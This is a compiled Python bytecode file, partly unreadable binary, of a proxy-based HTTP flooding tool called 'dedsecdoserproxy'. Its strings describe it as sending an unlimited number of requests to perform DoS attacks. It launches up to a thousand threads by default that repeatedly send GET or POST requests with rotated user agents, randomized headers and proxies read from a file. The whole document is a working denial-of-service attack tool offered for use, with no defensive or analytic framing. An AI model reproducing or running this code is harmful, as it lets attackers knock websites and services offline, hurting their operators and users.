3

5�]\  �               @   s�   d dl Z d dlZd dlZd dlZd dlZd dlZdZg ad ag Z	dd� Z
dd� Zdd� Zd	d
� Z
dd� Zd
d� Zdd� ZG dd� dej�ZG dd� dej�Zdd� Zedkr�eejdd� � dS )�    N� c             C   s*   | t kr&td|  dt  � t j| � d S )N�
z after %i requests)�printedMsgs�print�request_counter�append)�msg� r	   �dedsecdoserproxy.py�printMsg   s    r   c               C   s|   t jd� t jd� t jd� t jd� t jd� t jd� t jd� t jd� t jd	� t jd
� t jd� t jd� t S )
NzRMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3zjMozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)zmMozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)zXMozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1zsMozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1zmMozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)z�Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)zKMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)zdMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)z9Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)z.Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)z>Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51)�headers_useragentsr   r	   r	   r	   r
   �useragent_list   s(    




r
   c             C   s4   d}x*t d| �D ]}tjdd�}|t|�7 }qW |S )Nr   r   �A   �Z   )�range�random�randint�chr)�sizeZout_str�i�ar	   r	   r
   �randomString-   s
    r   c              C   sr   t �  tjt�dddttjdd�� ttjdd��dd	�} trnx.tD ]&}| j|j	d
�d |j	d
�d i� qDW | S )
Nzno-cachezISO-8859-1,utf-8;q=0.7,*;q=0.7zhttps://www.bing.com/�   �
   �n   �x   z
keep-alive)z
User-Agentz
Cache-ControlzAccept-CharsetZRefererz
Keep-AliveZ
Connection�:r   �   )
r
   r   Zchoicer   r   r   �str�additionalHeaders�update�split)�headers�headerr	   r	   r
   �initHeaders5   s    
&r$   c             C   s>   t jjdt � t jj�  | dkr*td� | dkr:td� d S )Nz
%i requests has been senti�  zYou have been throttledi�  zStatus code 500 received)�sys�stdout�writer   �flushr   Z
printedMsg)�status_coder	   r	   r
   �handleStatusCodesG   s    
r*   c             C   sj   t dd�}|j� }d|f}d|f}||d�}t� }y&td7 atj| ||d�}t|j� W n   Y nX d S )Nz	proxy.txt�rzhttp://zhttps://)ZhttpZhttpsr   )r"   �proxies)�open�readr$   r   �requests�getr*   r)   )�urlZ	proxyreadZdedsecreadproxyZ
http_proxyZhttps_proxy�ProxyServerr"   �requestr	   r	   r
   �sendGETS   s    
r4   c             C   sV   t � }y>td7 a|r(tj| ||td�}ntj| |td�}t|j� W n   Y nX d S )Nr   )�datar"   r,   )r"   r,   )r$   r   r/   Zpostr2   r*   r)   )r1   �payloadr"   r3   r	   r	   r
   �sendPOSTk   s    r7   c               @   s   e Zd Zdd� ZdS )�
SendGETThreadc          	   C   s$   yxt t� qW W n   Y nX d S )N)r4   r1   )�selfr	   r	   r
   �runz   s
    zSendGETThread.runN)�__name__�
__module__�__qualname__r:   r	   r	   r	   r
   r8   y   s   r8   c               @   s   e Zd Zdd� ZdS )�SendPOSTThreadc          	   C   s&   yxt tt� qW W n   Y nX d S )N)r7   r1   r6   )r9   r	   r	   r
   r:   �   s
    zSendPOSTThread.runN)r;   r<   r=   r:   r	   r	   r	   r
   r>   �   s   r>   c             C   s�   t jdd�}|jddd� |jddd� |jdd	d d
� |jddd d
d� |jdddtd� |j� }|ja|ja|j	r�|j	a
x t|j�D ]}t
� }|j�  q�W |jr�|ja
x t|j�D ]}t� }|j�  q�W ttj�dkr�|j�  t�  d S )Nz]Sending unlimited amount of requests in order to perform DoS attacks. Written by Barak Tawily)Zdescriptionz-gz&Specify GET request. Usage: -g '<url>')�helpz-pz'Specify POST request. Usage: -p '<url>'z-dz%Specify data payload for POST request)r?   �defaultz-ahz[Specify addtional header/s. Usage: -ah 'Content-type: application/json' 'User-Agent: Doser'�*)r?   r@   �nargsz-tz$Specify number of threads to be usedi�  )r?   r@   �typer   )�argparse�ArgumentParser�add_argument�int�
parse_argsZahr   �dr6   �gr1   r   �tr8   �start�pr>   �lenr%   �argvZ
print_help�exit)rO   �parser�argsr   rK   r	   r	   r
   �main�   s2    
rS   �__main__r   )r/   r%   Z	threadingr   �rerD   �hostr   r   r   r   r
   r   r$   r*   r4   r7   ZThreadr8   r>   rS   r;   rO   r	   r	   r	   r
   �<module>   s*   

!
